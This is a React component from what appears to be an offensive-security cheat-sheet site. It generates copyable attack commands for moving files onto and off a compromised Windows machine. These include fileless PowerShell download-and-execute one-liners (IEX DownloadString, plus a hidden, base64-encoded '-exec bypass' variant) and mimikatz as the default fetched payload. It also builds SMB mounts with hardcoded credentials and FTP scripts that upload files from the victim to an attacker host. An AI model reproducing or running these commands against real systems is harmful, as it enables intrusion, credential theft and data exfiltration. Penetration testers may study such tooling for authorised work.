import React from 'react';
import PersistedState from 'use-persisted-state';
import { Typography, Row, Col, Divider, Input, Space } from 'antd';
import { WifiOutlined, createFromIconfontCN, FolderOutlined, FileDoneOutlined } from '@ant-design/icons';
import { Ipv4TcpCacheState } from "components/types/Ipv4TcpCacheState";
import Link from 'antd/es/typography/Link';
import '../../i18n';
import { useTranslation } from 'react-i18next';

const { Title, Paragraph, Text } = Typography;
const IconFont = createFromIconfontCN({
    scriptUrl: ['./iconfont.js']
});

export default function FileTransfer() {
    const useIPv4State = PersistedState<Ipv4TcpCacheState>('ipv4_tcp_cache');
    const { t } = useTranslation();
    const [values, setValues] = useIPv4State({
        ip: '',
        port: '',
        target_file_name: 'http://10.0.0.1/mimikatz.exe',
        output_file_name: 'mimikatz.exe',
    });

    const handleChange = (name: string) => (event: { target: { value: string } }) => {
        setValues({ ...values, [name]: event.target.value });
    };

    const fileDownload = `(New-Object Net.WebClient).DownloadFile('${values.target_file_name}','${values.output_file_name}')`
    const fileDownloadAsync = `(New-Object Net.WebClient).DownloadFileAsync('${values.target_file_name}','${values.output_file_name}')`
    const fileLessIEX = `IEX (New-Object Net.WebClient).DownloadString('${values.target_file_name}')`
    const encoder = new TextEncoder();
    const utf16Encoded = encoder.encode(fileLessIEX);
    const utf16Extended = new Uint8Array(utf16Encoded.length * 2);
    utf16Encoded.forEach((byte, index) => { utf16Extended[index * 2] = byte; utf16Extended[index * 2 + 1] = 0; });
    const base64Encoded = btoa(String.fromCharCode.apply(null, utf16Extended));
    const b64_fileLessIEX = `powershell -exec bypass -WindowStyle Hidden -NoLogo -Noexit -enc "${base64Encoded}"`
    const fileLessIEXPipe = `(New-Object Net.WebClient).DownloadString('${values.target_file_name}') | IEX`
    const iwr = `iwr -Uri '${values.target_file_name}' -OutFile '${values.output_file_name}'`
    const InvokeWebRequest = `Invoke-WebRequest -Uri '${values.target_file_name}' -OutFile '${values.output_file_name}'`
    const copyFromSmb = `copy \\\\${values.ip}\\${values.output_file_name}`
    const mountShareWithPasswords = `net use z: \\\\${values.ip}\\share /user:johnDoe Sup3rP@ssw0rd!`
    const DownloadFromFTP = `(New-Object System.Net.WebClient).DownloadFile('ftp://${values.ip}/${values.output_file_name}','${values.output_file_name}')`
    const scriptFTP = `echo open ${values.ip} ${values.port} > ftp.txt
echo USER anonymous >> ftp.txt
echo GET ${values.output_file_name} >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt`
    const powershellFTPUpload = `(New-Object System.Net.WebClient).UploadFile('ftp://${values.ip}/${values.output_file_name}','C:\\Users\\Public\\${values.output_file_name}')`
    const scriptUploadFTP = `echo open ${values.ip} ${values.port} > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo PUT ${values.output_file_name} >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt`
    document.title = `${t('filetrans_title')} - HackTrick Checklist`;
    return (
        <div>
            <div>
                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                    {t('filetrans_title')}
                </Title>
                <Paragraph style={{ margin: 15 }}>
                    {t('filetrans_desc')}
                </Paragraph>
                <div style={{ padding: 15 }}>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={12}>
                            <Input
                                maxLength={15}
                                prefix={<WifiOutlined />}
                                name='Ip adress'
                                placeholder='IP Address or domain (ex: 212.212.111.222)'
                                onChange={handleChange('ip')}
                                value={values.ip}
                            />
                        </Col>
                        <Col span={12}>
                            <Input
                                maxLength={5}
                                prefix={<IconFont type='icon-Network-Plug' />}
                                name='Port'
                                placeholder='Port (ex: 1337)'
                                onChange={handleChange('port')}
                                value={values.port}
                            />
                        </Col>
                    </Row>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }} style={{ marginTop: 15 }}>
                        <Col span={12}>
                            <Input
                                prefix={<FolderOutlined />}
                                name='File name'
                                placeholder='URL (ex: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)'
                                onChange={handleChange('target_file_name')}
                                value={values.target_file_name}
                            />

                        </Col>
                        <Col span={12}>
                            <Input
                                prefix={<FileDoneOutlined />}
                                name='File name'
                                placeholder='Output file (ex: PowerView.ps1)'
                                onChange={handleChange('output_file_name')}
                                value={values.output_file_name}
                            />
                        </Col>
                    </Row>
                </div>
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Space direction='vertical'>
                    <Title level={3}>
                        {t('filetrans_ps')}
                    </Title>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileDownload}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileDownloadAsync}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Space direction='vertical'>
                    <Title level={3}>
                        {t('filetrans_psfl')}
                    </Title>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileLessIEX}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileLessIEXPipe}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {b64_fileLessIEX}
                            </Text>
                        </pre>
                    </Text>
                    <Title level={4}>{t('filetrans_psfl_webrequest')}</Title>
                    <Text>
                        {t('filetrans_psfl_webrequest_desc')}
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {InvokeWebRequest}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {iwr}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <Divider dashed />
            <div style={{ padding: 15, marginTop: 15 }}>
                <Space direction='vertical'>
                    <Title level={3}>
                        {t('filetrans_smb')}
                    </Title>
                    <Text>
                        {t('filetrans_smb_desc_1')}
                    </Text>
                    <Text>
                        {t('filetrans_smb_desc_2')}
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo impacket-smbserver share -smb2support /tmp/smb_share
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {copyFromSmb}
                            </Text>
                        </pre>
                    </Text>
                    <Text italic>{t('filetrans_smb_desc_3')}</Text>
                    <Text italic>{t('filetrans_smb_desc_4')}</Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo impacket-smbserver share -smb2support /tmp/smbshare -user johnDoe -password Sup3rP@ssw0rd!
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {mountShareWithPasswords}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <Divider dashed />
            <div style={{ padding: 15, marginTop: 15 }}>
                <Space direction='vertical'>
                    <Title level={3}>
                        {t('filetrans_ftp')}
                    </Title>
                    <Text>
                        {t('filetrans_ftp_desc')}
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo pip3 install pyftpdlib
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo python3 -m pyftpdlib --port 21
                            </Text>
                        </pre>
                    </Text>
                    <Title level={4}>{t('filetrans_ftp_ps')}</Title>
                    <Text>
                        <pre>
                            <Text copyable>
                                {DownloadFromFTP}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {scriptFTP}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <div style={{ padding: 15, marginTop: 15 }}>
                <Space direction='vertical'>
                    <Title level={3}>
                        {t('filetrans_ftp_up')}
                    </Title>
                    <Text>
                        {t('filetrans_ftp_desc')}
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo python3 -m pyftpdlib --port 21 --write
                            </Text>
                        </pre>
                    </Text>
                    <Title level={4}>{t('filetrans_ftp_ps')}</Title>
                    <Text>
                        <pre>
                            <Text copyable>
                                {powershellFTPUpload}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {scriptUploadFTP}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
        </div>
    );
}